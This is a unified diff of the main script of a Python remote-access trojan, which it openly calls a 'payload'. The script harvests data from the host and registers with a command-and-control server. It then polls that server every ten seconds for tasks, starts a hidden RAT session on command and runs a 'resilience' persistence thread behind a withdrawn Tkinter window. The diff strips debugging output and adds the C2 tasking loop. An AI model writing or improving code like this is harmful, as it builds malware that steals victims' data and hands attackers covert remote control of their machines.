@@ -1,77 +1,46 @@
 import time
 import threading
 import socket
-import traceback  # Import the traceback module
+import traceback
+import tkinter as tk
+import asyncio
 
-# --- We will import these inside the main function to catch import errors ---
-# from harvester import harvest_all_data
-# from resilience import manage_resilience
-# from comms import register_with_c2, send_heartbeat
+# Import all modules at the top level
+import actions
+from harvester import harvest_all_data
+from comms import register_with_c2, send_heartbeat, C2_URL, session_id
+from resilience import manage_resilience
 
-# --- CONFIGURATION (Builder will set this) ---
 ENABLE_RESILIENCE = True
 
-def main():
-    """Main execution flow for the payload."""
-    print("[*] Main function started.")
+def process_tasks(tasks):
+    if not tasks: return
+    for task in tasks:
+        command = task.get("command")
+        print(f"[*] Received command: {command}")
+        if command == "show_popup":
+            actions.show_popup(task.get("text", "Default Popup"))
+        elif command == "start_rat":
+            # Start the async RAT session in a new thread
+            threading.Thread(target=lambda: asyncio.run(actions.rat_session(session_id, C2_URL)), daemon=True).start()
 
-    # --- Import modules inside the function to catch potential ModuleNotFoundErrors ---
-    print("[*] Importing core modules...")
-    from harvester import harvest_all_data
-    from comms import register_with_c2, send_heartbeat
-    print("[*] Core modules imported successfully.")
+def payload_logic_thread():
+    try:
+        if ENABLE_RESILIENCE: threading.Thread(target=manage_resilience, daemon=True).start()
+        hostname = socket.gethostname()
+        initial_data = harvest_all_data()
+        register_with_c2(hostname, initial_data)
 
-    if ENABLE_RESILIENCE:
-        print("[*] Resilience is enabled. Importing and starting resilience thread...")
-        from resilience import manage_resilience
-        resilience_thread = threading.Thread(target=manage_resilience, daemon=True)
-        resilience_thread.start()
-        print("[*] Resilience thread started.")
-    else:
-        print("[*] Resilience is disabled.")
-
-
-    # Initial data harvest and registration
-    print("[*] Starting data harvest...")
-    harvested_data = harvest_all_data()
-    print("[*] Data harvest complete.")
-
-    print("[*] Getting hostname...")
-    hostname = socket.gethostname()
-    print(f"[*] Hostname found: {hostname}")
-
-    print("[*] Registering with C2 server...")
-    register_with_c2(hostname, harvested_data)
-    print("[*] Registration attempt finished.")
-
-    # Main loop for heartbeats
-    print("[*] Entering main heartbeat loop...")
-    while True:
-        send_heartbeat()
-        print(f"[*] Heartbeat sent. Sleeping for 30 seconds.")
-        time.sleep(30)
+        while True:
+            response = send_heartbeat()
+            if response and "tasks" in response:
+                process_tasks(response["tasks"])
+            time.sleep(10)
+    except Exception:
+        print(f"[!!!] Payload logic thread crashed:\n{traceback.format_exc()}")
 
 if __name__ == "__main__":
-    # This is our master "safety net" to catch ANY error during startup or runtime.
-    try:
-        print("--------------------------------------------------")
-        print("[*] Payload script entry point reached.")
-        main()
-
-    except Exception as e:
-        # If ANY error occurs, it will be caught here.
-        print("\n" * 3)
-        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-        print("!!!   A CRITICAL AND UNEXPECTED ERROR OCCURRED   !!!")
-        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-        print(f"\n[ERROR TYPE]: {type(e).__name__}")
-        print(f"[ERROR DETAILS]: {e}")
-        print("\n[FULL TRACEBACK]:")
-        # traceback.print_exc() prints the detailed error report.
-        traceback.print_exc()
-
-    finally:
-        # This code will run NO MATTER WHAT, ensuring the window stays open.
-        print("\n--------------------------------------------------")
-        print("[*] Script has finished or crashed.")
-        input("    Press Enter to exit...")
+    gui_root = tk.Tk(); gui_root.withdraw()
+    actions.init_gui(gui_root)
+    c2_thread = threading.Thread(target=payload_logic_thread, daemon=True); c2_thread.start()
+    gui_root.mainloop()
